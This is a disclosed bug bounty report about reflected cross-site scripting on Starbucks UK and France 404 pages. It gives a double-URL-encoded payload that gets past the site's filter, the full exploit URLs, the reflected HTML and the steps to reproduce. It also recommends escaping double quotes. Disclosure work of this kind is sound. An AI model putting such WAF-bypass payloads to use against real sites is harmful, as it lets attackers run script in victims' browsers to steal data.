# Reflected cross-site scripting on multiple Starbucks assets.

## Report Details
- **Report ID**: 629745
- **URL**: https://hackerone.com/reports/629745
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-06-26T07:05:03.094Z
- **Disclosed**: 2019-10-16T18:53:26.084Z

## Reporter
- **Username**: stealthy
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information
> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Please indicate NA, if not applicable. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report!

**Summary:** [Many Starbucks websites are vulnerable to cross-site scripting on 404 pages because double quotes lack sanitizing in hidden input tags, which leads to JavaScript execution.]

**Description:** [Starbucks employs a WAF which redirects any URL with a double quote to an error page. However, using double encoding, this can be bypassed. I used double encoding for most of the payload, which includes white spaces. My payload is below.

```text
htp8bi2zcg%2522%2520accesskey=%2527x%2527%2520onclick=%2527confirm`1`%2527%2520//2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1
```
The payload is just the on click event with the access key set as x, and the rest of a Starbucks URL added as an arbitrary parameter to make sure the onclick event works.
```text
htp8bi2zcg" accesskey='x' onclick='confirm`1`' //2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1
```
This vulnerability affects multiple Starbucks websites. Two are listed below.

    https://www.starbucks.co.uk/htp8bi2zcg%2522%2520accesskey=%2527x%2527%2520onclick=%2527confirm%601%60%2527%2520//2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1

    https://www.starbucks.fr/htp8bi2zcg%2522%2520accesskey=%2527x%2527%2520onclick=%2527confirm%601%60%2527%2520//2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1

The vulnerable HTML is below.
```html
<link rel="canonical" href="https://www.starbucks.co.uk/htp8bi2zcg" accesskey="x" onclick="confirm`1`" 2injectiontrme47nbfq="" blonde="" bright-sky-blend="" ground="1&quot;">
```
As you can see, the injection is successful.]

**Platform(s) Affected:** [Tested in Firefox Quantum 67.0.]

## Steps To Reproduce:

(Add details for how we can reproduce the issue)

1: Visit the link below.

    https://www.starbucks.fr/htp8bi2zcg%2522%2520accesskey=%2527x%2527%2520onclick=%2527confirm%601%60%2527%2520//2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1

2: The key bind on MAC is CONTROL+ALT+X and on Windows is ALT+SHIFT+X.

## Supporting Material/References:

  * List any additional material (e.g. screenshots, logs, etc.)
{F516988}
██████


## How can the system be exploited with this bug?
Execute arbitrary JavaScript in a victim's browser to steal information or perform unwanted actions on the victim's behalf.

## How did you come across this bug ?
I was trying to bypass the double quote filter for SQL injection and came across this XSS when I looked at the HTML.

## Recommendations for fix
 
* Escape double quotes.

## Impact

JavaScript is against Starbucks users on multiple critical domains. JavaScript execution results in information theft and an attacker can perform unwanted actions on a victim's behalf.

## Attachments
- Screen_Shot_2019-06-25_at_11.41.40_PM.png
